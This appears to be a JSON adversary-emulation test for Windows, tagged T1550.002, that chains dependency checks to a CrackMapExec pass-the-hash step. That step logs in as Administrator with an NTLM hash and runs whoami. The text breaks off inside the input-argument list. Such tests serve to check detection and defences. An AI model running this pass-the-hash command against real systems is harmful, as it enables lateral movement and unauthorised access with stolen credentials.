{
  "id": "eb05b028-16c8-4ad8-adea-6f5b219da9a9",
  "name": "crackmapexec Pass the Hash",
  "description": "command execute with crackmapexec\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "41b2384c-a487-4ccc-9c13-cdca9413a4e7",
      "type": "execute-command",
      "data": {
        "command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "7b0e95cb-4dff-4afa-b155-ba94cb8dd952",
      "name": "Check dependency 1/1",
      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "1aa19be1-7c0e-4ad4-aaa9-e5dcf5e3ed95",
      "name": "Resolve dependency 1/1",
      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "631cc619-963f-4f37-ada4-dee8a56d1597",
      "name": "Re-check dependency 1/1",
      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "7b0e95cb-4dff-4afa-b155-ba94cb8dd952",
      "p": "on-success",
      "o": "41b2384c-a487-4ccc-9c13-cdca9413a4e7"
    },
    {
      "s": "7b0e95cb-4dff-4afa-b155-ba94cb8dd952",
      "p": "on-failure",
      "o": "1aa19be1-7c0e-4ad4-aaa9-e5dcf5e3ed95"
    },
    {
      "s": "1aa19be1-7c0e-4ad4-aaa9-e5dcf5e3ed95",
      "p": "on-success",
      "o": "631cc619-963f-4f37-ada4-dee8a56d1597"
    },
    {
      "s": "631cc619-963f-4f37-ada4-dee8a56d1597",
      "p": "on-failure",
      "o": "41b2384c-a487-4ccc-9c13-cdca9413a4e7"
    }
  ],
  "tags": [
    "T1550",
    "T1550.002"
  ],
  "input_arguments": [
    {
      "name": "user_name",
      "type": "string",
      "description": "username",
      "value": "Administrator"
    },
    {
      "name": "crackmapexec_exe",
      "type": "path",
      "description": "crackmapexec windows executable",
      "value": "C:\\CrackMapExecWin\\crackmapexec.exe"
    },
    {
      "name": "command",
      "type": "string",
      "description": "command to execute",
      "value": "whoami"
    },
    {
      "name": "ntlm",
      "type": "string",
      "description": "command",
      "value": "cc36cf7a8514893efccd3324464tkg1a"
    },
